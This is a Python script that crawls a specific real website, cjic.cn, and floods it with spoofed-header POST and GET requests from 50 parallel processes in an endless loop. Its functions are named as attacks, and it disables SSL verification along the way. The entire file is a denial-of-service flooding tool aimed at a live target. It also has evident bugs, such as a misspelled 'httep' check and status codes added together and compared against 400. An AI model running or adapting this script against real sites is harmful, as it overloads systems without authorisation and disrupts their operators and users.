from requests import post, get
from urllib.request import urlopen
from bs4 import BeautifulSoup
from multiprocessing import Pool
import ssl
import re
from random import shuffle

protected_links = []
initial_url = "https://www.cjic.cn/"


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Host": "httpbin.org",
    "Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"103\", \"Chromium\";v=\"103\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62",
    "X-Amzn-Trace-Id": "Root=1-62d97997-52126d921d3b378f2e6185a8"}


def single_attack(url: str, args: int):
    if post(url=url, json="json.json", headers=headers).status_code + \
            get(url=url, headers=headers).status_code == 400:
        return f"{url}: Success. Count: {args}."
    else:
        global protected_links
        protected_links.append(url)
        print(protected_links)
        return f"{url}: Dinied."


def get_subpage(url: str):  # 得到二级页面链接
    linklst = []  # Create a list whichs stores the urls of the sub-webpage

    # Ignore SSL certificate errors
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    html = urlopen(url, context=ctx).read()
    soup = BeautifulSoup(html, "html.parser")

    # Retrieve all the anchor tags.
    tags = soup("a") + soup("span")
    for tag in tags:
        for raw in re.findall("href=[\"](\S+?)[\"]", str(tag)):
            if raw == "/" or re.findall("htm", url.split(sep=".")[-1]):
                continue
            elif not raw.startswith("http") and url.endswith("/"):
                raw = url[: -1] + raw
            elif not raw.startswith("httep") and not url.endswith("/"):
                raw = url + raw
            if raw in protected_links or "cjic" not in raw:
                continue
            else:
                linklst.append(raw)
    return linklst


def pool_attack(args: int):
    def multi_attack(url):
        print(single_attack(url, args))
        suburls = list(get_subpage(url))
        shuffle(suburls)
        for suburl in suburls:
            multi_attack(suburl)
    print(multi_attack(initial_url))


if __name__ == '__main__':
    while True:
        p = Pool(50)
        p.map_async(pool_attack, range(100))
        p.close()
        p.join()